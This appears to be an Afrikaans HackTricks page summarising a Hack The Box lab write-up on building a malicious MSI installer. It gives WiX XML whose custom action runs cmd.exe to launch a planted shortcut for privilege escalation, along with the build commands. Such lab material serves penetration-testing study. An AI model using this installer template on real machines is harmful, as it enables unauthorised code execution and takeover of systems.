<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

# Die Skep van 'n Skadelike MSI en die Kry van Root-toegang

Die skepping van die MSI-installeerder sal gedoen word met behulp van wixtools, spesifiek [wixtools](http://wixtoolset.org) sal gebruik word. Dit is die moeite werd om te vermeld dat alternatiewe MSI-bouers geprobeer is, maar hulle was nie suksesvol in hierdie spesifieke geval nie.

Vir 'n omvattende begrip van wix MSI-gebruik voorbeelde, is dit raadsaam om [hierdie bladsy](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) te raadpleeg. Hier kan jy verskeie voorbeelde vind wat die gebruik van wix MSI demonstreer.

Die doel is om 'n MSI te genereer wat die lnk-lêer sal uitvoer. Om dit te bereik, kan die volgende XML-kode gebruik word ([xml van hier](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Dit is belangrik om daarop te let dat die Package-element eienskappe soos InstallerVersion en Compressed bevat, wat die weergawe van die installateur aandui en aandui of die pakket saamgedruk is of nie, onderskeidelik.

Die skeppingsproses behels die gebruik van candle.exe, 'n instrument van wixtools, om 'n wixobject uit msi.xml te genereer. Die volgende bevel moet uitgevoer word:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Daarbenewens is dit die moeite werd om te vermeld dat 'n prent in die pos verskaf word wat die opdrag en sy uitset uitbeeld. Jy kan daarna verwys vir visuele leiding.

Verder sal light.exe, 'n ander instrument van wixtools, gebruik word om die MSI-lêer van die wixobject te skep. Die uit te voer opdrag is as volg:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Soortgelyk aan die vorige bevel, word 'n prentjie in die pos ingesluit wat die bevel en sy uitset illustreer.

Let daarop dat, hoewel hierdie opsomming waardevolle inligting bied, dit aanbeveel word om na die oorspronklike pos te verwys vir meer omvattende besonderhede en akkurate instruksies.

## Verwysings
* [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
* [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>
